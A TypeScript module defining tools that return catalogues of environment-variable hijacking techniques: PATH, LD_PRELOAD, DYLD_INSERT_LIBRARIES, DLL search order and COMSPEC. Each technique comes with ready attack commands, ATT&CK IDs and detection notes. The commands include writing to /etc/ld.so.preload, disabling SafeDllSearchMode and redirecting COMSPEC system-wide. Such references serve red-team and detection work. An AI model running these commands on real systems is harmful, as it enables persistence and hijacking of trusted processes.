import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface EnvvarTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  variable: string;
  command: string;
  stealth_score: number;
  attck_ids: string[];
  detection_notes: string;
}

// ── envvar_path_hijack ──────────────────────────────────────────────────────

const envvar_path_hijack: ToolDef = {
  name: "envvar_path_hijack",
  description: "PATH environment variable hijacking techniques — prepend a malicious directory to PATH so that a trojanized binary is executed instead of the legitimate one",
  schema: {
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const plat: Platform = args.platform;
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByAttck("T1574.007", plat));

    const techniques: EnvvarTechnique[] = [
      {
        technique: "Linux PATH prepend hijack",
        description: "Prepend a user-controlled directory to PATH, place a malicious binary with the same name as a commonly invoked command (e.g., ls, cat, id) in that directory",
        platform: "linux", variable: "PATH",
        command: "export PATH=/tmp/evil:$PATH && echo -e '#!/bin/sh\\nid > /tmp/pwned\\n/usr/bin/ls \"$@\"' > /tmp/evil/ls && chmod +x /tmp/evil/ls",
        stealth_score: 3, attck_ids: ["T1574.007"],
        detection_notes: "Monitor PATH modifications in shell profiles (.bashrc, .profile). Audit process execution paths via auditd. Compare executed binary path vs expected system path.",
      },
      {
        technique: "Windows PATH hijack via user environment",
        description: "Modify the user-level PATH variable to include a writable directory containing a malicious DLL or EXE that shadows a system binary",
        platform: "windows", variable: "PATH",
        command: "setx PATH \"C:\\Users\\Public\\evil;%PATH%\"",
        stealth_score: 3, attck_ids: ["T1574.007", "T1574.001"],
        detection_notes: "Monitor registry changes to HKCU\\Environment\\Path. Detect setx.exe execution modifying PATH. Sysmon Event 13 (RegistryEvent).",
      },
      {
        technique: "macOS PATH hijack via shell profile",
        description: "Modify ~/.zshrc or ~/.bash_profile to prepend a hijack directory to PATH, intercepting calls to common utilities",
        platform: "macos", variable: "PATH",
        command: "echo 'export PATH=/tmp/evil:$PATH' >> ~/.zshrc",
        stealth_score: 3, attck_ids: ["T1574.007"],
        detection_notes: "Monitor modifications to shell profile files. Endpoint security tools track PATH changes. Use kextpolicy and file integrity monitoring.",
      },
    ];

    const filtered = techniques.filter(t => t.platform === plat);

    return json({
      technique: "path_hijack", total_techniques: filtered.length,
      platform: plat, techniques: filtered,
      kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── envvar_ld_preload ───────────────────────────────────────────────────────

const envvar_ld_preload: ToolDef = {
  name: "envvar_ld_preload",
  description: "LD_PRELOAD injection techniques — force the dynamic linker to load a malicious shared library before all others, allowing function hooking and code injection on Linux",
  schema: {},
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByAttck("T1574.006", "linux"));

    const techniques: EnvvarTechnique[] = [
      {
        technique: "LD_PRELOAD environment variable injection",
        description: "Set LD_PRELOAD to a malicious shared library path. The dynamic linker loads this library first, allowing function interposition (hooking libc functions like read, write, open)",
        platform: "linux", variable: "LD_PRELOAD",
        command: "LD_PRELOAD=/tmp/evil.so /usr/bin/target_binary",
        stealth_score: 3, attck_ids: ["T1574.006", "T1055.009"],
        detection_notes: "Monitor LD_PRELOAD in /proc/<pid>/environ. Audit /etc/ld.so.preload for persistent injection. YAMA LSM can restrict this. Check ldd output for unexpected libraries.",
      },
      {
        technique: "Persistent LD_PRELOAD via /etc/ld.so.preload",
        description: "Write a library path into /etc/ld.so.preload to inject the library into every dynamically linked process on the system — requires root but provides system-wide persistence",
        platform: "linux", variable: "LD_PRELOAD (/etc/ld.so.preload)",
        command: "echo /lib/evil.so >> /etc/ld.so.preload",
        stealth_score: 2, attck_ids: ["T1574.006", "T1547.006"],
        detection_notes: "File integrity monitoring on /etc/ld.so.preload. Any non-empty content is suspicious. Audit file writes to this path.",
      },
    ];

    return json({
      technique: "ld_preload_injection", total_techniques: techniques.length,
      platform: "linux", techniques,
      kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── envvar_dyld_insert ──────────────────────────────────────────────────────

const envvar_dyld_insert: ToolDef = {
  name: "envvar_dyld_insert",
  description: "DYLD_INSERT_LIBRARIES injection on macOS — force dyld to load a malicious dylib before all others, enabling function hooking and code injection",
  schema: {},
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByAttck("T1574.006", "macos"));

    const techniques: EnvvarTechnique[] = [
      {
        technique: "DYLD_INSERT_LIBRARIES injection",
        description: "Set DYLD_INSERT_LIBRARIES to a malicious dylib path. macOS dyld loads this library first into the target process, allowing function interposition. Restricted by Hardened Runtime and SIP",
        platform: "macos", variable: "DYLD_INSERT_LIBRARIES",
        command: "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/Target.app/Contents/MacOS/target",
        stealth_score: 3, attck_ids: ["T1574.006", "T1055.009"],
        detection_notes: "Monitor DYLD_INSERT_LIBRARIES in process environment. Apps with Hardened Runtime or library validation entitlements are immune. SIP-protected binaries ignore DYLD_ variables.",
      },
      {
        technique: "DYLD_FRAMEWORK_PATH hijack",
        description: "Set DYLD_FRAMEWORK_PATH to redirect framework loading to a directory containing a trojanized framework, intercepting legitimate framework calls",
        platform: "macos", variable: "DYLD_FRAMEWORK_PATH",
        command: "DYLD_FRAMEWORK_PATH=/tmp/evil_frameworks /Applications/Target.app/Contents/MacOS/target",
        stealth_score: 3, attck_ids: ["T1574.006", "T1574.001"],
        detection_notes: "Monitor DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH. Endpoint security can detect non-standard framework loading paths. SIP mitigates for system binaries.",
      },
    ];

    return json({
      technique: "dyld_insert_libraries", total_techniques: techniques.length,
      platform: "macos", techniques,
      kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── envvar_dll_search_order ─────────────────────────────────────────────────

const envvar_dll_search_order: ToolDef = {
  name: "envvar_dll_search_order",
  description: "DLL search order hijacking via PATH manipulation — place a malicious DLL in a PATH directory that Windows searches before the legitimate DLL location",
  schema: {},
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByAttck("T1574.001", "windows"));

    const techniques: EnvvarTechnique[] = [
      {
        technique: "DLL search order hijacking via PATH",
        description: "Windows searches for DLLs in the application directory, system directories, then directories in the PATH variable. Placing a malicious DLL in a PATH directory that is searched before the legitimate location allows hijacking",
        platform: "windows", variable: "PATH",
        command: "copy payload.dll C:\\Users\\Public\\target_dll.dll && setx PATH \"C:\\Users\\Public;%PATH%\"",
        stealth_score: 3, attck_ids: ["T1574.001", "T1574.007"],
        detection_notes: "Monitor DLL loads from non-standard directories. Sysmon Event 7 (ImageLoaded) with unusual paths. Detect PATH modifications via registry events.",
      },
      {
        technique: "CWD-based DLL hijacking via PATH",
        description: "If SafeDllSearchMode is disabled, the current working directory is searched before system directories. Running a vulnerable application from a directory containing a malicious DLL triggers the hijack",
        platform: "windows", variable: "SafeDllSearchMode (registry)",
        command: "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\" /v SafeDllSearchMode /t REG_DWORD /d 0 /f",
        stealth_score: 2, attck_ids: ["T1574.001"],
        detection_notes: "Monitor SafeDllSearchMode registry key changes. Default is enabled (1). Disabling is a strong indicator of DLL hijack preparation.",
      },
    ];

    return json({
      technique: "dll_search_order_hijack", total_techniques: techniques.length,
      platform: "windows", techniques,
      kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── envvar_comspec ───────────────────────────────────────────────────────────

const envvar_comspec: ToolDef = {
  name: "envvar_comspec",
  description: "COMSPEC and shell environment variable abuse — redirect the default command interpreter to a malicious executable on Windows",
  schema: {
    platform: z.enum(["windows"]).describe("Target platform (Windows only)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("comspec", "windows"));

    const techniques: EnvvarTechnique[] = [
      {
        technique: "COMSPEC redirection",
        description: "Change the COMSPEC environment variable to point to a malicious executable. Any program that launches %COMSPEC% (e.g., cmd.exe) will execute the malicious binary instead",
        platform: "windows", variable: "COMSPEC",
        command: "set COMSPEC=C:\\Users\\Public\\evil.exe",
        stealth_score: 3, attck_ids: ["T1574.007", "T1059.003"],
        detection_notes: "Monitor COMSPEC environment variable changes. Legitimate value is always C:\\Windows\\System32\\cmd.exe. Any deviation is suspicious. Sysmon Event 13 for registry changes.",
      },
      {
        technique: "COMSPEC abuse via scheduled task",
        description: "Modify COMSPEC before a scheduled task executes that uses cmd.exe internally, causing the task to invoke the malicious binary with SYSTEM privileges",
        platform: "windows", variable: "COMSPEC",
        command: "setx /M COMSPEC C:\\Users\\Public\\evil.exe",
        stealth_score: 2, attck_ids: ["T1574.007", "T1053.005"],
        detection_notes: "Monitor system-wide COMSPEC changes via setx /M. Audit HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment for COMSPEC modifications.",
      },
      {
        technique: "windir/SystemRoot variable abuse",
        description: "Modify windir or SystemRoot environment variables to redirect references to system directories, causing applications to load DLLs or executables from an attacker-controlled path",
        platform: "windows", variable: "windir / SystemRoot",
        command: "set windir=C:\\Users\\Public\\fakesys",
        stealth_score: 2, attck_ids: ["T1574.007"],
        detection_notes: "Monitor changes to windir and SystemRoot variables. Legitimate values point to C:\\Windows. EDR can flag process creation with modified system variables.",
      },
    ];

    return json({
      technique: "comspec_abuse", total_techniques: techniques.length,
      platform: "windows", techniques,
      kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const envvarAbuseTools: ToolDef[] = [
  envvar_path_hijack,
  envvar_ld_preload,
  envvar_dyld_insert,
  envvar_dll_search_order,
  envvar_comspec,
];
